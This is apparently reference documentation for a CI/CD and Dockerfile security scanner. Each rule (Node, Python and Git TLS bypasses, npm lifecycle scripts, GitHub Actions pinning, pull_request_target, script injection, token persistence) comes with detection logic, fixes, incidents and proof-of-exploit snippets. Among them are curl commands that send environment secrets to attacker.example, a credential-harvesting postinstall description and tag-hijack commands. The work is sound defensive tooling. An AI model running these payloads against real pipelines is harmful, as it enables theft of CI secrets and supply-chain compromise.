**Recommendation.** Pass ``--ignore-scripts`` to every ``npm`` / ``npm ci`` / ``pnpm install`` / ``yarn install`` invocation in the Dockerfile, or set ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` / ``ENV YARN_ENABLE_SCRIPTS=false`` before the install line. Lifecycle scripts (``preinstall``, ``install``, ``postinstall``, ``prepare``) are the blast radius of the Shai-Hulud / TanStack / axios incidents, a single compromised dependency in the transitive tree runs arbitrary code with the build container's credentials. ``--ignore-scripts`` removes that primitive without affecting lockfile resolution; the few legitimate consumers (``node-gyp``-based native modules) should be allow-listed via a follow-up ``npm rebuild <pkg> --ignore-scripts=false`` line scoped to the specific package.

**Known false positives.**

- Images that build native modules via ``node-gyp`` need the lifecycle scripts to compile bindings (``better-sqlite3``, ``sharp``, ``canvas``, ...). The fix is per-package: keep the top-level install on ``--ignore-scripts``, then ``RUN npm rebuild better-sqlite3`` afterward, scoped to the audited package. Suppress with a one-line rationale only when an engineer has confirmed every script-running dep is first-party or pinned to a hash.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): postinstall scripts in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. ``--ignore-scripts`` neutralizes the postinstall primitive at install time.
- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Lockfile pinning did not help (the pinned tag itself was poisoned); ``--ignore-scripts`` would have stopped execution.

**Proof of exploit.**

```
# Vulnerable: postinstall in a transitive dep runs with the
# builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
FROM node:20@sha256:<digest>
COPY package.json package-lock.json ./
RUN npm ci          # <-- runs postinstall of every dep

# Attack: the compromised package's package.json carries:
#   "scripts": { "postinstall": "node ./harvest.js" }
# harvest.js reads ~/.npmrc, process.env, ~/.aws/credentials
# and POSTs them to a webhook. The image is also tampered:
# the script writes a second-stage loader into node_modules
# that runs at every container start.

# Safe: scripts disabled at install time; rebuild only the
# audited native-module set afterward.
FROM node:20@sha256:<digest>
ENV NPM_CONFIG_IGNORE_SCRIPTS=true
COPY package.json package-lock.json ./
RUN npm ci --ignore-scripts
RUN npm rebuild better-sqlite3 sharp    # audited allowlist
```

**Source:** [`DF-024`](../providers/dockerfile.md#df-024) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-026`: ENV disables Node.js TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-026 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on any ``ENV NODE_TLS_REJECT_UNAUTHORIZED=`` value that resolves to ``0`` (or the string ``"0"``). The documented Node.js mechanism for disabling TLS verification, applies to every TLS socket the runtime opens for the rest of the image's life. ``ENV ... =1`` (re-enable) and ``ENV ... =`` (clear) pass. The same primitive shows up in npm postinstall logs whenever a dep tries to fetch over a network the runner can't verify; once the env is set, the failure mode that caught the bad cert is gone.

**Recommendation.** Remove the ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0`` instruction. The variable tells Node's TLS layer to accept any certificate the upstream presents — self-signed, expired, hostname-mismatched, attacker-presented. Anything baked into ``ENV`` applies to every Node process the image ever launches: ``npm install``, ``npm publish``, runtime fetch calls, postinstall scripts. The attacker doesn't need to compromise the registry — they only need to MITM the network path between the container and any HTTPS endpoint.

If the internal registry / API genuinely has a self-signed cert, install the CA into the image's truststore instead: ``COPY ca.crt /usr/local/share/ca-certificates/`` + ``RUN update-ca-certificates`` (Debian) or ``RUN cat ca.crt >> /etc/ssl/certs/ca-certificates.crt`` (Alpine). The CA install is a one-time build cost; the bypass is a permanent runtime liability.

**Known false positives.**

- Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.

**Proof of exploit.**

```
# Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
# disables TLS verification for every Node.js process
# in the container. Any HTTPS call (npm install at
# runtime, internal API call, vendor SDK) is MITM-able.
FROM node@sha256:abc123...
ENV NODE_TLS_REJECT_UNAUTHORIZED=0
COPY . /app
WORKDIR /app
CMD ["npm", "start"]

# Safe: install the missing CA into the image trust
# store and leave ``NODE_TLS_REJECT_UNAUTHORIZED`` at
# its safe default. Node honors the system CA bundle.
FROM node@sha256:abc123...
COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates
COPY . /app
WORKDIR /app
CMD ["npm", "start"]
```

**Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on ``ENV PYTHONHTTPSVERIFY=0`` (also the stringy ``"0"``). The variable is the documented Python mechanism for disabling stdlib HTTPS verification; once set in the image ENV, every ``urllib``-based TLS connection (and the libraries that delegate to it) accept any certificate.

Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS bypass via env). Together the three cover the same primitive shape across pip-flag, Node-env, and Python-env surfaces.

**Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.

If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.

**Proof of exploit.**

```
# Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
# verification for every Python process in the
# container. pip, requests-via-urllib3, every API call
# now ignores certificate validity.
FROM python@sha256:abc123...
ENV PYTHONHTTPSVERIFY=0
COPY . /app
WORKDIR /app
CMD ["python", "main.py"]

# Safe: install the missing CA, keep PYTHONHTTPSVERIFY
# at the safe default. Python's ``ssl`` module reads
# from the system CA store.
FROM python@sha256:abc123...
COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates
COPY . /app
WORKDIR /app
CMD ["python", "main.py"]
```

**Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-028`: ENV disables Git TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-028 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on ``ENV GIT_SSL_NO_VERIFY`` set to any truthy value (``1``, ``true``, ``yes``, ``on``). The documented Git mechanism for disabling SSL verification per-process; in ``ENV`` form, every Git operation the image runs (and every downstream tool that shells out to ``git``) sees the bypass.

Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests TLS) for the env-var-based TLS-bypass surface.

**Recommendation.** Remove the ``ENV GIT_SSL_NO_VERIFY`` instruction (or set it to ``0`` / unset it explicitly). The variable tells every ``git clone`` / ``git fetch`` / ``git pull`` in the image to accept any TLS certificate the upstream presents. Baked into ``ENV`` it applies to:

* ``RUN git clone`` in subsequent build stages
* ``git+https://...`` deps that pip / npm / cargo / go   modules clone at install time
* Any runtime process that shells out to ``git``   (release-publishing scripts, mirror jobs, GitOps   agents reading from the image)

If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.

**Proof of exploit.**

```
# Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
# certificate verification for every clone / fetch. A
# MITM substitutes the remote's contents on the next
# git operation.
FROM alpine/git@sha256:abc123...
ENV GIT_SSL_NO_VERIFY=1
RUN git clone https://internal.example.com/repo.git /src

# Safe: install the missing CA, keep git's SSL
# verification on. ``GIT_SSL_CAPATH`` / ``GIT_SSL_CAINFO``
# can also be used to point git at a specific CA bundle
# if updating the system trust store isn't an option.
FROM alpine/git@sha256:abc123...
COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates && \
    git clone https://internal.example.com/repo.git /src
```

**Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires when ``ENV REQUESTS_CA_BUNDLE`` resolves to a value that disables verification:

* ``/dev/null`` (literal),
* the empty string (``ENV REQUESTS_CA_BUNDLE=`` or   ``ENV REQUESTS_CA_BUNDLE=""``),
* whitespace-only values.

A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificates/internal.crt``) passes — the rule only flags the disable shapes. Pairs with DF-027 (Python TLS via env).

**Recommendation.** Set ``ENV REQUESTS_CA_BUNDLE`` to the path of a real CA bundle (typically ``/etc/ssl/certs/ca-certificates.crt`` on Debian or ``/etc/ssl/cert.pem`` on Alpine), or unset it entirely so the ``requests`` library falls back to ``certifi``. Pointing the variable at ``/dev/null`` or an empty string is a documented anti-pattern: ``requests`` treats the empty / missing bundle as 'verify against nothing,' which silently accepts every certificate.

The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.

**Proof of exploit.**

```
# Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
# the empty string, or a non-existent path) neuters the
# CA bundle Python's requests library consults. Every
# HTTPS call requests makes silently fails verification
# or accepts any cert.
FROM python@sha256:abc123...
ENV REQUESTS_CA_BUNDLE=/dev/null
COPY . /app
WORKDIR /app
CMD ["python", "main.py"]

# Safe: point ``REQUESTS_CA_BUNDLE`` at the system trust
# store (or leave it unset, in which case requests uses
# certifi). Install internal CAs into the system store
# rather than papering over with a null bundle.
FROM python@sha256:abc123...
COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates
ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
COPY . /app
WORKDIR /app
CMD ["python", "main.py"]
```

**Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).

### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Proof of exploit.**

```
# Vulnerable: ECR repo with ``imageScanningConfiguration.
# scanOnPush: false``. Every pushed image lands without
# a vulnerability scan; the registry's downstream consumers
# pull whatever CVE-laden base layer the build produced.
import boto3
ecr = boto3.client('ecr')
ecr.create_repository(
    repositoryName='myapp',
    imageScanningConfiguration={'scanOnPush': False},
)

# Safe: enable scan-on-push. Pair with Inspector v2
# enhanced scanning (ECR-007) for continuous re-scans
# against the latest CVE database. Block deploys on
# scan failures via an Inspector finding -> EventBridge
# -> CodePipeline gate.
ecr.put_image_scanning_configuration(
    repositoryName='myapp',
    imageScanningConfiguration={'scanOnPush': True},
)
# Enable enhanced scanning org-wide:
inspector = boto3.client('inspector2')
inspector.enable(resourceTypes=['ECR'])
```

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }

**Evidences:** [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** ECR-001's basic on-push scan covers OS-level packages, apt / yum / apk lineage. Most production CVE risk is in language ecosystems (npm, pip, gem, mvn) which the basic scanner ignores. Inspector v2 enhanced scanning closes that gap and runs continuously, so a CVE published two weeks after a build still surfaces against the deployed image.

**Recommendation.** Enable Amazon Inspector v2 for the ``ECR`` scan type on this account. Basic ECR scanning on-push only covers OS packages; Inspector v2 enhanced scanning adds language-ecosystem CVEs and runs continuously as new vulnerabilities are published.

**Source:** [`ECR-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `GHA-001`: Action not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-001 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Every `uses:` reference should pin a specific 40-char commit SHA. Tag and branch refs (`@v4`, `@main`) can be silently moved to malicious commits by whoever controls the upstream repository, a third-party action compromise will propagate into the pipeline on the next run.

**Recommendation.** Replace tag/branch references (`@v4`, `@main`) with the full 40-char commit SHA. Use Dependabot or StepSecurity to keep the pins fresh.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- tj-actions/changed-files compromise ([CVE-2025-30066](https://www.cve.org/CVERecord?id=CVE-2025-30066), March 2025): a malicious commit retagged behind ``@v1`` / ``@v45`` shipped CI-secret exfiltration to roughly 23,000 repos that had pinned the action to a mutable tag instead of a commit SHA.
- reviewdog/action-setup compromise ([CVE-2025-30154](https://www.cve.org/CVERecord?id=CVE-2025-30154), March 2025): same week, similar mechanism. Tag-pinned consumers auto-pulled the malicious version; SHA-pinned consumers were unaffected.

**Proof of exploit.**

```
# Tag-pinned reference (vulnerable):
- uses: tj-actions/changed-files@v45

# Attack: the upstream maintainer (or anyone who compromises
# the upstream repo) force-moves the v45 tag to a malicious
# commit:
#   git tag -f v45 <attacker-controlled-sha>
#   git push --force origin v45
# Every consumer's next workflow run pulls the new code
# automatically, executing the attacker's payload with the
# job's secrets and GITHUB_TOKEN in scope.

# Safe: pin to a 40-char commit SHA (immutable):
- uses: tj-actions/changed-files@a284dc1814e3fdd1a3a7f16c11f02e2cd5a98f93  # v45.0.0
```

**Source:** [`GHA-001`](../providers/github.md#gha-001) in the [GitHub Actions provider](../providers/github.md).

### `GHA-002`: pull_request_target checks out PR head <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-002 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** `pull_request_target` runs with a write-scope GITHUB_TOKEN and access to repository secrets, deliberately so, since it's how labeling and comment-bot workflows work. When the same workflow then explicitly checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}` or `.ref`) it executes attacker-controlled code with those privileges.

**Recommendation.** Use `pull_request` instead of `pull_request_target` for any workflow that must run untrusted code. If you need write scope, split the workflow: a `pull_request_target` job that labels the PR, and a separate `pull_request`-triggered job that builds it with read-only secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020), the canonical write-up. Demonstrates how a fork PR that lands in a ``pull_request_target`` workflow with the PR head checked out runs in the base repo's privileged context.
- [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/) (GitHub Security Lab, 2020): catalogued real-world Actions carrying the same primitive. The fix pattern (split the workflow into a privileged labeler + an unprivileged builder) is now standard guidance.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + checkout PR head =
# attacker code runs with secrets + write-scope token.
name: build-pr
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: make test            # runs PR-head Makefile

# Attack: any external contributor opens a fork PR with a
# tampered Makefile:
#
#   test:
#   	curl -X POST https://attacker.example/exfil \
#   	  -d "$(env)" \
#   	  -d "$(git config --get-all http.https://github.com/.extraheader)"
#
# CI runs the malicious target with the base repo's secrets
# (every ${{ secrets.* }} the workflow has access to) and a
# write-scope GITHUB_TOKEN. The PR doesn't even need to be
# merged or reviewed — the privileged execution happens at
# PR-open time.

# Safe: split the workflow. The labeler runs with secrets
# but never checks out PR head; the builder runs in
# ``pull_request`` context with no secrets:
name: triage      # privileged half
on: { pull_request_target: { types: [opened, synchronize] } }
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr edit ${{ github.event.number }} --add-label triage
        env:
          GH_TOKEN: ${{ github.token }}
---
name: build       # unprivileged half
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # checks out PR head
      - run: make test                    # no secrets in scope
```

**Source:** [`GHA-002`](../providers/github.md#gha-002) in the [GitHub Actions provider](../providers/github.md).

### `GHA-003`: Script injection via untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-003 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Interpolating attacker-controlled context fields (PR title/body, issue body, comment body, commit message, discussion body, head branch name, `github.ref_name`, `inputs.*`, release metadata, deployment payloads) directly into a `run:` block is shell injection. GitHub expands `${{ ... }}` BEFORE shell quoting, so any backtick, `$()`, or `;` in the source field executes.

**Recommendation.** Pass untrusted values through an intermediate `env:` variable and reference that variable from the shell script. GitHub's expression evaluation happens before shell quoting, so inline `${{ github.event.* }}` is always unsafe.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [GitHub Security Lab disclosure](https://securitylab.github.com/research/github-actions-untrusted-input/) (2020): a sweep of public Actions found dozens of widely-used workflows interpolating ``github.event.issue.title`` / ``pull_request.title`` directly into shell. Any commenter or PR author could run arbitrary commands in the maintainer's CI.
- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (GitHub Security Lab, 2020): the same primitive against ``pull_request_target`` workflows where the runner has secrets and a write-scope token; one fork PR exfiltrates every secret the workflow can see. Mitigation: never interpolate context into shell, route through ``env:``.

**Proof of exploit.**

```
# Vulnerable: PR title interpolated straight into shell.
name: triage
on:
  pull_request_target:
    types: [opened, edited]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "New PR: ${{ github.event.pull_request.title }}"

# Attack: open a PR with the title:
#
#   foo"; curl -X POST https://attacker.example/exfil \
#         -d "$(env | base64 -w0)"; echo "
#
# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the
# title's `"` closes the echo string and the rest of the line
# becomes shell. The pull_request_target trigger means the
# runner already has secrets and a write-scope GITHUB_TOKEN,
# so the curl exfils every secret the workflow can see.

# Safe: route through env so the value is never interpolated
# into the shell template:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "New PR: $PR_TITLE"
```

**Source:** [`GHA-003`](../providers/github.md#gha-003) in the [GitHub Actions provider](../providers/github.md).

### `GHA-004`: Workflow permissions block missing or overprovisioned <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-004 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Without an explicit `permissions:` block (either top-level or per-job), the GITHUB_TOKEN inherits the repository's default scope, typically `write`. A compromised step receives far more privilege than it needs.

Beyond the missing-block case, the rule also flags over-grants: a job that declares ``packages: write`` but never runs ``docker push`` / ``npm publish`` / ``gh release upload``, a job that declares ``issues: write`` but never calls ``gh issue ...``, a job that declares ``security-events: write`` but never invokes a SARIF uploader, etc. Wildcard consumers (``actions/github-script``) suppress the flag because they can reach any scope through the GitHub API.

**Recommendation.** Add a top-level `permissions:` block (start with `contents: read`) and grant additional scopes only on the specific jobs that need them. For job-level blocks, prune any write scope no step in the job actually uses, the rule names the specific scopes the job's steps don't justify.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Read-only / lint-only workflows that do not call any write-scoped API often pass without an explicit block because the default token scope on public repos is read. The rule defaults to MEDIUM confidence to reflect this. For the overprovisioned-scope case, false positives can appear when a workflow consumes a scope through a third-party action this rule's consumer list doesn't recognize yet, file an issue to extend the catalog when discovered.

**Source:** [`GHA-004`](../providers/github.md#gha-004) in the [GitHub Actions provider](../providers/github.md).

### `GHA-005`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-005 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` secrets in GitHub Actions can't be rotated on a fine-grained schedule and remain valid until manually revoked. OIDC with `role-to-assume` yields short-lived credentials per workflow run.

**Recommendation.** Use `aws-actions/configure-aws-credentials` with `role-to-assume` + `permissions: id-token: write` to obtain short-lived credentials via OIDC. Remove the static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY secrets.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- LocalStack and Moto integration tests set ``AWS_ENDPOINT_URL`` to a localhost address and use the sentinel ``test`` / ``test`` access keys (the LocalStack convention). Those values can't authenticate against real AWS, so the rule auto-suppresses an env block that pairs a localhost endpoint with sentinel keys.

**Source:** [`GHA-005`](../providers/github.md#gha-005) in the [GitHub Actions provider](../providers/github.md).

### `GHA-019`: GITHUB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-019 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Two shapes are flagged:

1. **Direct.** ``run:`` body writes ``GITHUB_TOKEN`` (or any ``${{ secrets.* }}`` value) to a file, ``$GITHUB_ENV``, ``$GITHUB_OUTPUT``, or ``$GITHUB_STATE``, or pipes it through ``tee``.
2. **ArtiPACKED (Palo Alto Unit 42, 2024).** Pairs ``actions/checkout`` (default ``persist-credentials: true``, or explicitly set to true) with a downstream ``actions/upload-artifact`` whose ``path:`` covers the repo root (``.``, ``./``, ``${{ github.workspace }}``, or an explicit ``.git/`` reference). The checkout writes the runtime ``GITHUB_TOKEN`` into ``.git/config`` via ``extraheader``; the upload step bundles the whole working directory including ``.git/``, so anyone with read access to the run can ``gh run download`` the artifact and read the token out of ``.git/config``. The rule fires once per offending job; the per-finding location points at the upload step.

Carve-out: secrets leaked to the workflow log (via ``set -x`` shell trace, ``echo $TOKEN``, or URL-embedded credentials that a process tool logs) are GHA-033's domain, not GHA-019's. ``greylag-ci/cicd-goat`` scenario 27 fires GHA-033 only — the secret leaks to log via ``set -x`` but no token persists to file / ``$GITHUB_ENV`` / artifact, which is the persistence shape GHA-019 covers.

**Recommendation.** Never write GITHUB_TOKEN to files, artifacts, or GITHUB_ENV. Use the token inline via ${{ secrets.GITHUB_TOKEN }} in the step that needs it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: token written to a file that survives the
# step boundary and lands in the upload-artifact bundle.
jobs:
  build:
    permissions: { contents: write, packages: write }
    steps:
      - run: echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/token
      - run: make build                   # writes /tmp/token
                                          # into ./dist/
      - uses: actions/upload-artifact@<sha>
        with:
          name: build-output
          path: dist/

# Attack: any contributor (or, on public repos, anyone)
# downloads the artifact:
#
#   gh run download <run-id> -n build-output
#   cat build-output/tmp/token            # full GITHUB_TOKEN
#
# The token is scoped to the workflow's permissions block —
# in this case write to ``contents`` and ``packages``,
# enough to push tampered binaries to GHCR or rewrite the
# branch the workflow runs on. Composes with SCM-001
# (unprotected default branch) into XPC-004's "open a PR,
# fetch artifact, ship malicious binary" loop.

# Other persistence patterns the rule catches:
#   echo "TOKEN=$GITHUB_TOKEN" >> $GITHUB_ENV
#   echo "::set-output name=tok::$GITHUB_TOKEN"
#   echo "$SECRET" | tee /tmp/cache/secret

# Safe: use the token inline in the step that needs it; never
# write it anywhere that survives the step's environment:
      - run: gh release create v1.0.0 dist/*
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Source:** [`GHA-019`](../providers/github.md#gha-019) in the [GitHub Actions provider](../providers/github.md).

### `GHA-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-020 }

**Evidences:** [`1.5.4`](#ctrl-1-5-4) Ensure scanners are in place to identify and confirm presence of vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GHA-020`](../providers/github.md#gha-020) in the [GitHub Actions provider](../providers/github.md).

### `GHA-030`: OIDC token requested without environment-protected job <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-030 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** Pairs with IAM-008. IAM-008 verifies the AWS-side trust policy pins audience + subject; this rule verifies the GitHub-side workflow can't request the token from any branch without a deployment gate. A misconfiguration on either side defeats the OIDC story.

**Recommendation.** Bind every job that exchanges the GHA OIDC token for cloud credentials to a protected ``environment:`` (e.g. ``environment: production``). Environment protections layer in branch restrictions, required reviewers, and deployment windows that the IdP-side trust policy cannot enforce alone.

**Proof of exploit.**

```
# Vulnerable: a job requests an OIDC token (``id-token:
# write``) without an ``environment:`` binding. The token
# can be minted from any branch or any PR trigger; if the
# AWS / GCP / Azure trust policy permits any subject from
# the repo, a fork-PR build assumes prod.
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@<sha>
        with:
          role-to-assume: arn:aws:iam::123:role/prod-deploy
          aws-region: us-east-1

# Safe: bind the job to a protected environment that
# requires reviewer approval. The OIDC token is only
# mintable after the human gate fires AND the cloud-side
# trust policy pins ``sub`` to the protected environment.
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # required-reviewers gate
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@<sha>
        with:
          role-to-assume: arn:aws:iam::123:role/prod-deploy
          aws-region: us-east-1
```

**Source:** [`GHA-030`](../providers/github.md#gha-030) in the [GitHub Actions provider](../providers/github.md).

### `GHA-031`: Workflow uses retired set-output / save-state command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-031 }

**Evidences:** [`1.5.2`](#ctrl-1-5-2) Ensure scanners are in place to secure CI/CD pipeline instructions.

**How this is detected.** GitHub deprecated ``::set-output::`` and ``::save-state::`` in October 2022 because they read from the runner's stdout as a control channel. Any tool whose output happens to contain ``::set-output…`` (a CI job's own diagnostic, a downloaded log, an upstream test framework) silently sets a step output. The replacement workflow commands (``$GITHUB_OUTPUT`` / ``$GITHUB_STATE`` files) close that injection channel. Workflows still using the retired commands also depend on a deprecation timer that GitHub has extended several times. They will eventually break.

**Recommendation.** Replace ``echo "::set-output name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_OUTPUT"`` and ``echo "::save-state name=X::$VALUE"`` with ``echo "X=$VALUE" >> "$GITHUB_STATE"``. The old commands stream through the runner's stdout, which lets any log line that happens to start with ``::`` inject into the command channel. The file-redirect forms write to a private file the runner reads after the step exits, no log-line interleaving, no injection.

**Proof of exploit.**

```
# Vulnerable: ``echo "::set-output name=..."`` (and
# ``::save-state``) are retired GitHub-Actions workflow
# commands. GitHub disabled them due to a command-
# injection class where an attacker-controlled string
# carrying ``%0A::set-output name=secret::pwned`` (or
# similar) injects fake workflow commands into the
